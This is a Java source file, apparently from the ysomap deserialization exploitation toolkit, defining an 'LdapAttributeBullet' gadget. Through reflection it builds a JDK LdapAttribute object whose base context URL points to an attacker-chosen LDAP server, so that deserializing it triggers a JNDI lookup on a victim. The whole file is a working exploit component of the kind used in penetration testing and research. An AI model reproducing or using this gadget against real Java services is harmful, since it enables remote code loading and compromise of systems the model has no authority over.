package ysomap.core.bullet.jdk;

import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.util.ReflectionHelper;

import javax.naming.CompositeName;

/**
 * @author wh1t3P1g
 * @since 2021/1/18
 */
@Bullets
public class LdapAttributeBullet extends Bullet<Object> {

    @NotNull
    @Require(name = "ldapURL", detail = "jndi lookup url, like ldap://xxxx:1099, 这里不用带上objectName, 需要单独设置")
    public String ldapURL;

    @NotNull
    @Require(name = "objectName", detail = "需要查询的ObjectName ")
    public String objectName;

    public String action = "attributeDefinition";

    @Override
    public Object getObject() throws Exception {
        Object obj = ReflectionHelper.newInstance("com.sun.jndi.ldap.LdapAttribute", new Class<?>[]{String.class},"id");
        ReflectionHelper.setFieldValue(obj, "baseCtxURL", ldapURL);
        ReflectionHelper.setFieldValue(obj, "rdn", new CompositeName(objectName+"//b"));
        return obj;
    }
}
